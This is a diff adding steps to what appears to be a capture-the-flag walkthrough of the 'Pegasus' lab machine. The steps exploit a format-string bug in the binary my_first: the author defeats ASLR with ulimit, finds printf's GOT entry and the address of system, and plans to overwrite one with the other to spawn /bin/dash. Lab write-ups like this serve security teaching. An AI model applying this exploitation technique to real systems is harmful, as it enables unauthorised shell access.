@@ -246,3 +246,61 @@ Enter first number: 5
 Enter second number: %x
 %x
 Error details: bf9282ac
+This shows us that the binary is vulnerable to format strings
+Check to see if ASLR is enabled
+mike@pegasus:/home/mike$ cat /proc/sys/kernel/randomize_va_space
+cat /proc/sys/kernel/randomize_va_space
+2
+ASLR is enabled
+We can disable it as it is a 32 bit machine
+mike@pegasus:/home/mike$ uname -a
+uname -a
+Linux pegasus 3.13.0-39-generic #66~precise1-Ubuntu SMP Wed Oct 29 09:59:20 UTC 2014 i686 i686 i386 GNU/Linux
+
+ulimit -s unlimited will enlarges the stack and fixes the address of libc
+mike@pegasus:/home/mike$ ulimit -s unlimited
+ulimit -s unlimited
+mike@pegasus:/home/mike$ ldd my_first
+ldd my_first
+        linux-gate.so.1 =>  (0x40022000)
+        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x4002a000)
+        /lib/ld-linux.so.2 (0x40000000)
+mike@pegasus:/home/mike$
+
+Check for addresses of functions in the program
+mike@pegasus:/home/mike$ objdump -R my_first
+objdump -R my_first
+
+my_first:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049bec R_386_GLOB_DAT    __gmon_start__
+08049c20 R_386_COPY        stdin
+08049bfc R_386_JUMP_SLOT   printf
+08049c00 R_386_JUMP_SLOT   fgets
+08049c04 R_386_JUMP_SLOT   puts
+08049c08 R_386_JUMP_SLOT   __gmon_start__
+08049c0c R_386_JUMP_SLOT   __libc_start_main
+08049c10 R_386_JUMP_SLOT   putchar
+08049c14 R_386_JUMP_SLOT   strtol
+Address of printf is 08049bfc
+
+Finding the address of system
+mike@pegasus:/home/mike$ gdb -q ./my_first
+gdb -q ./my_first
+Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.
+(gdb) b main
+b main
+Breakpoint 1 at 0x804850f
+(gdb) r
+r
+Starting program: /home/mike/my_first
+
+Breakpoint 1, 0x0804850f in main ()
+(gdb) p system
+p system
+$1 = {<text variable, no debug info>} 0x40069060 <system>
+(gdb)
+So the address of system is 40069060
+Overwrite the address of printf with system and execute /bin/dash
